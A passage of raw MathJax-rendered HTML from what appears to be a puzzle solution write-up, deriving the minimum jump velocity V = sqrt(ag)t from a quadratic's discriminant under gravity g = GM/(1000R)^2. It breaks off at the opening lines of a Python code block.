stretchy=&quot;false&quot;>)</mo><mn>2</mn></msup></mrow></mfrac></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-54" role="math" style="width: 7.034em; display: inline-block;"><span style="display: inline-block; position: relative; width: 5.836em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(0.992em 1005.84em 3.596em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-55"><span class="mi" id="MathJax-Span-56" style="font-family: STIXGeneral-Italic;">g</span><span class="mo" id="MathJax-Span-57" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="mfrac" id="MathJax-Span-58" style="padding-left: 0.315em;"><span style="display: inline-block; position: relative; width: 3.805em; height: 0px; margin-right: 0.107em; margin-left: 0.107em;"><span style="position: absolute; clip: rect(3.18em 1001.62em 4.169em -999.997em); top: -4.685em; left: 50%; margin-left: -0.779em;"><span class="mrow" id="MathJax-Span-59"><span class="mi" id="MathJax-Span-60" style="font-family: STIXGeneral-Italic;">G</span><span class="mi" id="MathJax-Span-61" style="font-family: STIXGeneral-Italic;">M<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(3.076em 1003.7em 4.326em -999.997em); top: -3.279em; left: 50%; margin-left: -1.872em;"><span class="mrow" id="MathJax-Span-62"><span class="mo" id="MathJax-Span-63" style="font-family: STIXGeneral-Regular;">(</span><span class="mn" id="MathJax-Span-64" style="font-family: STIXGeneral-Regular;">1000</span><span class="mi" id="MathJax-Span-65" style="font-family: STIXGeneral-Italic;">R</span><span class="msubsup" id="MathJax-Span-66"><span style="display: inline-block; position: relative; width: 0.784em; height: 0px;"><span style="position: absolute; clip: rect(3.18em 1000.26em 4.326em -999.997em); top: -4.008em; left: 0.003em;"><span class="mo" id="MathJax-Span-67" style="font-family: STIXGeneral-Regular;">)</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -4.32em; left: 0.315em;"><span class="mn" id="MathJax-Span-68" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(0.836em 1003.8em 1.201em -999.997em); top: -1.247em; left: 0.003em;"><span style="display: inline-block; overflow: hidden; vertical-align: 0.003em; border-top-width: 1.3px; border-top-style: solid; width: 3.805em; height: 0px;"></span><span style="display: inline-block; width: 0px; height: 1.044em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -1.184em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 2.816em;"></span></span></nobr><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>g</mi><mo>=</mo><mfrac><mrow><mi>G</mi><mi>M</mi></mrow><mrow><mo stretchy="false">(</mo><mn>1000</mn><mi>R</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mfrac></math></span></span></div><script type="math/tex; mode=display" id="MathJax-Element-5">
+g = \frac{GM}{(1000R)^2}
+</script></span></p><p>(note <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-6-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>R</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-69" role="math" style="width: 0.784em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.628em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1000.63em 2.659em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-70"><span class="mi" id="MathJax-Span-71" style="font-family: STIXGeneral-Italic;">R</span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>R</mi></math></span></span><script type="math/tex" id="MathJax-Element-6">R</script></span> is in kilometers, so we convert it to meters)</p><p>then, let <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-7-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>V</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-72" role="math" style="width: 0.836em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.68em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1000.68em 2.659em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-73"><span class="mi" id="MathJax-Span-74" style="font-family: STIXGeneral-Italic;">V<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>V</mi></math></span></span><script type="math/tex" id="MathJax-Element-7">V</script></span> = velocity in <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-8-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>m</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo>/</mo></mrow><mi>s</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-75" role="math" style="width: 1.721em; display: inline-block;"><span style="display: inline-block; position: relative; width: 1.409em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1001.41em 2.659em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-76"><span class="mi" id="MathJax-Span-77" style="font-family: STIXGeneral-Italic;">m</span><span class="texatom" id="MathJax-Span-78"><span class="mrow" id="MathJax-Span-79"><span class="mo" id="MathJax-Span-80" style="font-family: STIXGeneral-Regular;">/</span></span></span><span class="mi" id="MathJax-Span-81" style="font-family: STIXGeneral-Italic;">s</span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>m</mi><mrow class="MJX-TeXAtom-ORD"><mo>/</mo></mrow><mi>s</mi></math></span></span><script type="math/tex" id="MathJax-Element-8">m/s</script></span> of the jump, <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-9-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi><mo>=</mo><mi>D</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo>/</mo></mrow><mi>v</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-82" role="math" style="width: 3.701em; display: inline-block;"><span style="display: inline-block; position: relative; width: 3.076em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1003.08em 2.659em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-83"><span class="mi" id="MathJax-Span-84" style="font-family: STIXGeneral-Italic;">t<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span class="mo" id="MathJax-Span-85" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="mi" id="MathJax-Span-86" style="font-family: STIXGeneral-Italic; padding-left: 0.315em;">D</span><span class="texatom" id="MathJax-Span-87"><span class="mrow" id="MathJax-Span-88"><span class="mo" id="MathJax-Span-89" style="font-family: STIXGeneral-Regular;">/</span></span></span><span class="mi" id="MathJax-Span-90" style="font-family: STIXGeneral-Italic;">v</span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi><mo>=</mo><mi>D</mi><mrow class="MJX-TeXAtom-ORD"><mo>/</mo></mrow><mi>v</mi></math></span></span><script type="math/tex" id="MathJax-Element-9">t = D/v</script></span> (the total duration of running and jumping), and <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-10-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>T</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-91" role="math" style="width: 0.784em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.628em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1000.63em 2.659em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-92"><span class="mi" id="MathJax-Span-93" style="font-family: STIXGeneral-Italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi></math></span></span><script type="math/tex" id="MathJax-Element-10">T</script></span> = duration in seconds from the jump to contact with module,</p><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><div class="MathJax_Display" style="text-align: center;"><span class="MathJax" id="MathJax-Element-11-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>a</mi><msup><mi>t</mi><mn>2</mn></msup><mo>=</mo><mi>V</mi><mi>T</mi><mo>&amp;#x2212;</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>g</mi><msup><mi>T</mi><mn>2</mn></msup></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-94" role="math" style="width: 10.159em; display: inline-block;"><span style="display: inline-block; position: relative; width: 8.44em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(0.992em 1008.44em 3.336em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-95"><span class="mfrac" id="MathJax-Span-96"><span style="display: inline-block; position: relative; width: 0.628em; height: 0px; margin-right: 0.107em; margin-left: 0.107em;"><span style="position: absolute; clip: rect(3.18em 1000.42em 4.169em -999.997em); top: -4.685em; left: 50%; margin-left: -0.258em;"><span class="mn" id="MathJax-Span-97" style="font-family: STIXGeneral-Regular;">1</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(3.18em 1000.47em 4.169em -999.997em); top: -3.331em; left: 50%; margin-left: -0.258em;"><span class="mn" id="MathJax-Span-98" style="font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(0.836em 1000.63em 1.201em -999.997em); top: -1.247em; left: 0.003em;"><span style="display: inline-block; overflow: hidden; vertical-align: 0.003em; border-top-width: 1.3px; border-top-style: solid; width: 0.628em; height: 0px;"></span><span style="display: inline-block; width: 0px; height: 1.044em;"></span></span></span></span><span class="mi" id="MathJax-Span-99" style="font-family: STIXGeneral-Italic;">a</span><span class="msubsup" id="MathJax-Span-100"><span style="display: inline-block; position: relative; width: 0.784em; height: 0px;"><span style="position: absolute; clip: rect(3.336em 1000.32em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-101" style="font-family: STIXGeneral-Italic;">t<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -4.424em; left: 0.367em;"><span class="mn" id="MathJax-Span-102" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-103" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="mi" id="MathJax-Span-104" style="font-family: STIXGeneral-Italic; padding-left: 0.315em;">V<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span class="mi" id="MathJax-Span-105" style="font-family: STIXGeneral-Italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span class="mo" id="MathJax-Span-106" style="font-family: STIXGeneral-Regular; padding-left: 0.263em;">−</span><span class="mfrac" id="MathJax-Span-107" style="padding-left: 0.263em;"><span style="display: inline-block; position: relative; width: 0.628em; height: 0px; margin-right: 0.107em; margin-left: 0.107em;"><span style="position: absolute; clip: rect(3.18em 1000.42em 4.169em -999.997em); top: -4.685em; left: 50%; margin-left: -0.258em;"><span class="mn" id="MathJax-Span-108" style="font-family: STIXGeneral-Regular;">1</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(3.18em 1000.47em 4.169em -999.997em); top: -3.331em; left: 50%; margin-left: -0.258em;"><span class="mn" id="MathJax-Span-109" style="font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(0.836em 1000.63em 1.201em -999.997em); top: -1.247em; left: 0.003em;"><span style="display: inline-block; overflow: hidden; vertical-align: 0.003em; border-top-width: 1.3px; border-top-style: solid; width: 0.628em; height: 0px;"></span><span style="display: inline-block; width: 0px; height: 1.044em;"></span></span></span></span><span class="mi" id="MathJax-Span-110" style="font-family: STIXGeneral-Italic;">g</span><span class="msubsup" id="MathJax-Span-111"><span style="display: inline-block; position: relative; width: 1.148em; height: 0px;"><span style="position: absolute; clip: rect(3.18em 1000.63em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-112" style="font-family: STIXGeneral-Italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -4.424em; left: 0.732em;"><span class="mn" id="MathJax-Span-113" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.872em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 2.566em;"></span></span></nobr><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>a</mi><msup><mi>t</mi><mn>2</mn></msup><mo>=</mo><mi>V</mi><mi>T</mi><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>g</mi><msup><mi>T</mi><mn>2</mn></msup></math></span></span></div><script type="math/tex; mode=display" id="MathJax-Element-11">
+\frac{1}{2}at^2 = VT - \frac{1}{2}gT^2
+</script></span></p><p>will hold. From this, we can get a quadratic equation regarding <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-12-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>T</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-114" role="math" style="width: 0.784em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.628em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1000.63em 2.659em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-115"><span class="mi" id="MathJax-Span-116" style="font-family: STIXGeneral-Italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi></math></span></span><script type="math/tex" id="MathJax-Element-12">T</script></span>,</p><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><div class="MathJax_Display" style="text-align: center;"><span class="MathJax" id="MathJax-Element-13-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mi>g</mi><msup><mi>T</mi><mn>2</mn></msup><mo>&amp;#x2212;</mo><mn>2</mn><mi>V</mi><mi>T</mi><mo>+</mo><mi>a</mi><msup><mi>t</mi><mn>2</mn></msup><mo>=</mo><mn>0</mn></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-117" role="math" style="width: 10.784em; display: inline-block;"><span style="display: inline-block; position: relative; width: 8.961em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.461em 1008.96em 2.867em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-118"><span class="mi" id="MathJax-Span-119" style="font-family: STIXGeneral-Italic;">g</span><span class="msubsup" id="MathJax-Span-120"><span style="display: inline-block; position: relative; width: 1.148em; height: 0px;"><span style="position: absolute; clip: rect(3.18em 1000.63em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-121" style="font-family: STIXGeneral-Italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -4.424em; left: 0.732em;"><span class="mn" id="MathJax-Span-122" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-123" style="font-family: STIXGeneral-Regular; padding-left: 0.263em;">−</span><span class="mn" id="MathJax-Span-124" style="font-family: STIXGeneral-Regular; padding-left: 0.263em;">2</span><span class="mi" id="MathJax-Span-125" style="font-family: STIXGeneral-Italic;">V<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span class="mi" id="MathJax-Span-126" style="font-family: STIXGeneral-Italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span class="mo" id="MathJax-Span-127" style="font-family: STIXGeneral-Regular; padding-left: 0.263em;">+</span><span class="mi" id="MathJax-Span-128" style="font-family: STIXGeneral-Italic; padding-left: 0.263em;">a</span><span class="msubsup" id="MathJax-Span-129"><span style="display: inline-block; position: relative; width: 0.784em; height: 0px;"><span style="position: absolute; clip: rect(3.336em 1000.32em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-130" style="font-family: STIXGeneral-Italic;">t<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -4.424em; left: 0.367em;"><span class="mn" id="MathJax-Span-131" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-132" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="mn" id="MathJax-Span-133" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">0</span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.309em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 1.441em;"></span></span></nobr><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>g</mi><msup><mi>T</mi><mn>2</mn></msup><mo>−</mo><mn>2</mn><mi>V</mi><mi>T</mi><mo>+</mo><mi>a</mi><msup><mi>t</mi><mn>2</mn></msup><mo>=</mo><mn>0</mn></math></span></span></div><script type="math/tex; mode=display" id="MathJax-Element-13">
+gT^2 - 2VT + at^2 = 0
+</script></span></p><p>T must be a real number so</p><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><div class="MathJax_Display" style="text-align: center;"><span class="MathJax" id="MathJax-Element-14-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mi mathvariant=&quot;normal&quot;>&amp;#x0394;</mi><mo>=</mo><msup><mi>V</mi><mn>2</mn></msup><mo>&amp;#x2212;</mo><mi>a</mi><mi>g</mi><msup><mi>t</mi><mn>2</mn></msup><mo>&amp;#x2265;</mo><mn>0</mn></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-134" role="math" style="width: 9.69em; display: inline-block;"><span style="display: inline-block; position: relative; width: 8.076em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.461em 1008.08em 2.867em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-135"><span class="mi" id="MathJax-Span-136" style="font-family: STIXGeneral-Regular;">Δ</span><span class="mo" id="MathJax-Span-137" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="msubsup" id="MathJax-Span-138" style="padding-left: 0.315em;"><span style="display: inline-block; position: relative; width: 1.201em; height: 0px;"><span style="position: absolute; clip: rect(3.18em 1000.68em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-139" style="font-family: STIXGeneral-Italic;">V<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -4.424em; left: 0.784em;"><span class="mn" id="MathJax-Span-140" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-141" style="font-family: STIXGeneral-Regular; padding-left: 0.263em;">−</span><span class="mi" id="MathJax-Span-142" style="font-family: STIXGeneral-Italic; padding-left: 0.263em;">a</span><span class="mi" id="MathJax-Span-143" style="font-family: STIXGeneral-Italic;">g</span><span class="msubsup" id="MathJax-Span-144"><span style="display: inline-block; position: relative; width: 0.784em; height: 0px;"><span style="position: absolute; clip: rect(3.336em 1000.32em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-145" style="font-family: STIXGeneral-Italic;">t<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -4.424em; left: 0.367em;"><span class="mn" id="MathJax-Span-146" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-147" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">≥</span><span class="mn" id="MathJax-Span-148" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">0</span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.309em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 1.441em;"></span></span></nobr><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi mathvariant="normal">Δ</mi><mo>=</mo><msup><mi>V</mi><mn>2</mn></msup><mo>−</mo><mi>a</mi><mi>g</mi><msup><mi>t</mi><mn>2</mn></msup><mo>≥</mo><mn>0</mn></math></span></span></div><script type="math/tex; mode=display" id="MathJax-Element-14">
+\Delta = V^2 - agt^2 \ge 0
+</script></span></p><p>The minimum <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-15-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>V</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-149" role="math" style="width: 0.836em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.68em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1000.68em 2.659em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-150"><span class="mi" id="MathJax-Span-151" style="font-family: STIXGeneral-Italic;">V<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>V</mi></math></span></span><script type="math/tex" id="MathJax-Element-15">V</script></span> where this equation holds is when</p><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><div class="MathJax_Display" style="text-align: center;"><span class="MathJax" id="MathJax-Element-16-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mi>V</mi><mo>=</mo><msqrt><mi>a</mi><mi>g</mi></msqrt><mi>t</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-152" role="math" style="width: 4.898em; display: inline-block;"><span style="display: inline-block; position: relative; width: 4.065em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1004.07em 3.023em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-153"><span class="mi" id="MathJax-Span-154" style="font-family: STIXGeneral-Italic;">V<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span><span class="mo" id="MathJax-Span-155" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="msqrt" id="MathJax-Span-156" style="padding-left: 0.315em;"><span style="display: inline-block; position: relative; width: 1.773em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.99em 4.378em -999.997em); top: -4.008em; left: 0.732em;"><span class="mrow" id="MathJax-Span-157"><span class="mi" id="MathJax-Span-158" style="font-family: STIXGeneral-Italic;">a</span><span class="mi" id="MathJax-Span-159" style="font-family: STIXGeneral-Italic;">g</span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(3.023em 1001.04em 3.388em -999.997em); top: -3.747em; left: 0.732em;"><span style="display: inline-block; position: relative; width: 1.044em; height: 0px;"><span style="position: absolute; font-family: STIXGeneral-Regular; top: -4.008em; left: 0.003em;">‾<span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; font-family: STIXGeneral-Regular; top: -4.008em; left: 0.523em;">‾<span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="font-family: STIXGeneral-Regular; position: absolute; top: -4.008em; left: 0.263em;">‾<span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; clip: rect(2.919em 1000.78em 4.169em -999.997em); top: -3.643em; left: 0.003em;"><span style="font-family: STIXVariants;">√</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mi" id="MathJax-Span-160" style="font-family: STIXGeneral-Italic;">t<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.497em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 1.378em;"></span></span></nobr><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>V</mi><mo>=</mo><msqrt><mi>a</mi><mi>g</mi></msqrt><mi>t</mi></math></span></span></div><script type="math/tex; mode=display" id="MathJax-Element-16">
+V = \sqrt{ag}t
+</script></span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span>
+<span data-linenumber="24"></span>
+<span data-linenumber="25"></span></div><div class="code"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">import</span> math
